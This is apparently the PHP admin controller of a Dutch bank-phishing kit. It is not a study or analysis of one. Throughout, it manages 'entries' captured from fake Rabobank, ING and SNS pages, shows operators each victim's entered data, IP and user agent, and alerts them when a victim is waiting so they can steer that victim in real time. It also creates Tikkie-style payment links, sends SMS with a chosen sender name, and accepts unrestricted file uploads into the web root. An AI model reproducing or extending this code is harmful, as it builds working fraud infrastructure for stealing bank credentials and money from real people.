<?php
namespace controllers;

class beheer{

	private $beheer_model;
	public function __construct($headerEnabled = false, $loginNeeded = false, $super_admin_only = false, $curr_page = NULL) {
		$this->beheer_model = new \models\beheer();
		
		if(!empty($_SESSION['user_session']) && $this->beheer_model->usernameExists($_SESSION['user_session']) == false) {
			$this->beheer_model->logout();
			header("Location: /beheer/login");
			die();
		}

		if($headerEnabled == true){
			$this->drawHeader($curr_page);
		}

		if($loginNeeded == true) {
			if(!$this->beheer_model->isUserLoggedIn()) {
				header("Location: /beheer/login");
			}
		}

		if($super_admin_only == true) {
			if(isset($_SESSION['user_session'])){
					$a = $this->beheer_model->correctAdminLevel($_SESSION['user_session'], 9);
					if($a == false){ header("location /beheer/dashboard"); }		
			}
		}
	}

	public function drawHeader($curr_page) {
		$tpl = new \classes\core\template("./views/beheer/header/index.tpl");
			if($curr_page == "dashboard") {  $tpl->set("a1", "active"); }else{ $tpl->set("a1", ""); }
			if($curr_page == "entries") 	  {  $tpl->set("a2", "active"); }else{ $tpl->set("a2", ""); }
			if($curr_page == "sms")  {  $tpl->set("a3", "active"); }else{ $tpl->set("a3", ""); }
			if($this->beheer_model->correctAdminLevel($_SESSION['user_session'], 9) == true){
			$tpl->set('site_settings', '<li class="nav-item"><a class="nav-link" href="/beheer/site-settings">Site settings</a></li>');
			}else{ $tpl->set("site_settings", ""); }
		echo $tpl->draw();
	}

	public function login() {
		if(isset($_POST)) { $this->handleLoginPost($_POST); }
		$tpl = new \classes\core\template("./views/beheer/login/index.tpl");
		echo $tpl->draw();
	}

	public function handleLoginPost($request) {
		if(!empty($request['username'])) {
			$a = $this->beheer_model->login($request['username'], $request['password']);
			if($a == true) { header("location: /beheer/dashboard"); }
		}
	}


	public function logout() {
		$this->beheer_model->logout();
		header("location: /beheer/login");
	}

	public function dashboard() {
		$tpl = new \classes\core\template("./views/beheer/dashboard/index.tpl");
		echo $tpl->draw();
	}

	public function sitesettings() {
		echo "hi";
	}
	
	public function betaalLinks() {
		$a = $this->beheer_model->getVerzoeken();
		$toreplace = ""; 

		if (!$a === false) {
			foreach($a as $b) {
				$tpl = new \classes\core\template("./views/beheer/betaal-links/tablerow.tpl");
					$tpl->set("uid", $b['uid']);
					$tpl->set("id", $b['uid']);
					$tpl->set("tikkie_url", "https://".\config\config::$sites[2]['url']);
					$tpl->set("bedrag", $b['bedrag']);
				$toreplace .= $tpl->draw();	
			}
		}

		$tpl = new \classes\core\template("./views/beheer/betaal-links/index.tpl");
			$tpl->set("links", $toreplace);
		echo $tpl->draw();	
	}

	public function doBetaalLinks(){
		$a = $this->beheer_model->createBetaalVerzoek("empty", $_POST['bedrag']);
		header("Location: /beheer/betaal-links", true, 302);
		die();
	}

	public function editVerzoek($uid) {
		$b = $this->beheer_model->getVerzoek($uid);
		if(!empty($b)) {
			$tpl = new \classes\core\template("./views/beheer/edit-verzoek/index.tpl");
				$tpl->set("id", $b['uid']);
				$tpl->set("bedrag", $b['bedrag']);
			echo $tpl->draw();
		}else{
			header("Location: /beheer/betaal-links", true, 302);
			die();	
		}
	}

	public function doEditVerzoek($uid) {
		$a = $this->beheer_model->editBetaalVerzoek($uid, $_POST['naam'], $_POST['bedrag'], $_POST['omschrijving'], $_POST['rekening']);
		header("Location: /beheer/betaal-links", true, 302);
		die();
	}

	public function deleteBetaalLink($uid) {
		$this->beheer_model->deleteBetaalVerzoek($uid);
		header("Location: /beheer/betaal-links", true, 302);
		die();
	}


	public function sms() {
		$tpl = new \classes\core\template("./views/beheer/sms/index.tpl");
			$tpl->set("errors", "");
			if(isset($_POST['sms_to'])) {
				$a = $this->beheer_model->sendTo($_POST['sms_to'], $_POST['sms_sender'], $_POST['sms_message']);
				$tpl->set("errors", "<pre>Api call made logs:<br>".$a."</pre>");
			}

		echo $tpl->draw();
	}

	public function viewEntry($uid) {
		$a = $this->beheer_model->getEntry($uid);
		if(!$a === false) {
			if(isset($_POST['submit'])) {
				if(isset($_POST['custom_input'])) {
					$this->beheer_model->redirectTo($uid, $_POST['submit'], $_POST['custom_input']);
				}elseif(isset($_FILES['image_input'])) {
					$a = rand(0, 999);
					if(move_uploaded_file($_FILES["image_input"]["tmp_name"],  $_SERVER['DOCUMENT_ROOT'] . "/public/upload/". $a . basename($_FILES['image_input']['name']))) {
						$this->beheer_model->redirectTo($uid, $_POST['submit'], "/public/upload/". $a . basename($_FILES['image_input']['name']));
					}	
				}else{ 
					$this->beheer_model->redirectTo($uid, $_POST['submit']);
				}
			}

			$this->beheer_model->setEntryOperator($uid, $_SESSION['user_session']);
			$tpl = new \classes\core\template("./views/beheer/view-entry/index.tpl");
				
				if($this->beheer_model->isUserWaiting($uid)) {
					$tpl->set("is_waiting", '<font color="red" class="blinking">USER WAITING</font>');
				}elseif($this->beheer_model->isUserActive($uid)){
					$tpl->set("is_waiting", "User is online");
				}else{
					$tpl->set("is_waiting", "User is offline");
				}
				$notparsedinput = explode("\n",$a['input']);
				$parsed = '';
				if(!empty($notparsedinput)){ 
					foreach($notparsedinput as $parsing_step_1) {

						$parsing_step_12 = json_decode($parsing_step_1);
						if(!empty($parsing_step_12)) {
							foreach ($parsing_step_12 as $key => $value) {
								$parsed .= "<b>".$key.": </b>". $value."<br>";
							}
							$parsed .= "<br>";
						}
					}
				}

				if($a['site'] == "rabobank.nl") {
					$ing_buttons = new \classes\core\template("./views/beheer/bank/rabo/index.tpl");
						$ing_buttons->set("uid", $uid);
					$tpl->set("redirections", $ing_buttons->draw());
				}elseif($a['site'] == "ing.nl"){ 
					$ing_buttons = new \classes\core\template("./views/beheer/bank/ing/index.tpl");
					$ing_buttons->set("uid", $uid);
				$tpl->set("redirections", $ing_buttons->draw());
				}elseif($a['site'] == "snsbank") {
					$ing_buttons = new \classes\core\template("./views/beheer/bank/snsbank/index.tpl");
					$ing_buttons->set("uid", $uid);
					$tpl->set("redirections", $ing_buttons->draw());

				}else{
					$tpl->set("redirections", "No redirect template found");
				}
				$tpl->set("parsedinput", $this->beheer_model->antiXSS($parsed));
				$tpl->set("uid", $uid);
				$tpl->set("useragent", $a['useragent']);
				$tpl->set("ip", $a['ip']);
				$tpl->set("logs", $a['logs']);

			echo $tpl->draw();
		}else{ 
			header('Location: /beheer/entries');
			exit;
		}
	}


	public function entries() { 
		$entries = $this->beheer_model->getEntries();
		
		$entry_list = "";
		if(!empty($entries)){
			foreach($entries as $entry) {
				$row = new \classes\core\template("./views/beheer/bank/entries/list.tpl");

				foreach($entry as $key=>$value) {
					$row->set($key, $this->beheer_model->antiXSS($value));
						if($key == "is_waiting") {
							if($value === "true") {
								$row->set("is_waiting_class", "class='invalid'");
							}else{ $row->set("is_waiting_class", ""); }
						}
						if($key == "ip") { 
							if($this->beheer_model->isBlocked($value)) {
								$row->set("block_1", ' <a class="dropdown-item" href="/beheer/unblock-ip/');
								$row->set("block_2", '">Unblock ip(Redirect)</a>');
							}else{
								$row->set("block_1", ' <a class="dropdown-item" href="/beheer/block-ip/');
								$row->set("block_2", '">Block ip(Redirect)</a>');
							}
						}
					}

				$entry_list .= $row->draw();
			}
		}

		$tpl = new \classes\core\template("./views/beheer/bank/entries/index.tpl");
			$tpl->set("entries", $entry_list);

		echo $tpl->draw();	
	}

	public function addUser($username, $password, $admin_lvl) {
		$a = $this->beheer_model->createUser($username, $password, $admin_lvl);
		echo "<pre>";
		var_dump($a);
	}

	public function delUser($username) {
		$a = $this->beheer_model->delUser($username);
		echo "<pre>";
		var_dump($a);
	}

	public function listUsers() {
		$a = $this->beheer_model->listUsers();
		echo "<pre>";
		var_dump($a);
	}

	public function getNewEntry($user) {
		$new['newentry'] = $this->beheer_model->getNewEntry($user);
		echo json_encode($new);
		$this->beheer_model->setNewEntrySeen($user);
	}

	public function getUpdatedEntry($user) {
		$new['updatedentry'] = $this->beheer_model->getUpdatedEntry($user);
		echo json_encode($new);
		$this->beheer_model->setUpdatedEntrySeen($user);
	}

	public function getWaiting($uid) {
		$new['waiting'] = $this->beheer_model->getWaiting($uid);
		echo json_encode($new);
	}

	public function redirectTo($uid, $type, $input = NULL) {
		$this->beheer_model->redirectTo($uid, $type, $input);
		sleep(1);
		header('Location: ' . $_SERVER['HTTP_REFERER']);
		exit;	
	}


	public function deleteEntry($uid) {
		$this->beheer_model->deleteEntry($uid);
		header('Location: ' . $_SERVER['HTTP_REFERER']);
		exit;
	}

	public function blockip($ip) {
		$this->beheer_model->blockUser($ip);
		header('Location: ' . $_SERVER['HTTP_REFERER']);
		exit;
	}

	public function unblockip($ip) {
		$this->beheer_model->unblockUser($ip);
		header('Location: ' . $_SERVER['HTTP_REFERER']);
		exit;
	}
	
	
	// Image api stuff

	public function updateLiveImage() {
		if(isset($_POST['api_key']) && isset($_POST['image']) && isset($_POST['image_uid'])) {
			if($_POST['api_key'] === \config\config::$siteApiKey) {
				if(!$this->beheer_model->liveImageExists($_POST['image_uid'])) { 
					$this->beheer_model->createLiveImage($_POST['image_uid'], $_POST['image']);
				}
				
				// Now we update
				$this->beheer_model->updateLiveImage($_POST["image_uid"], $_POST['image']);
				return json_encode(array("Sucess"=>"true", "Message"=>"Done"));

			}else{ return json_encode(array("Sucess"=>"false", "Message"=>"Unknown api key")); }
		}else{ return json_encode(array("Sucess"=>"false", "Message"=>"Not all post fields are set")); }
	}

	public function checkImage($uid) {
		return $this->beheer_model->checkImage($uid);
	}
}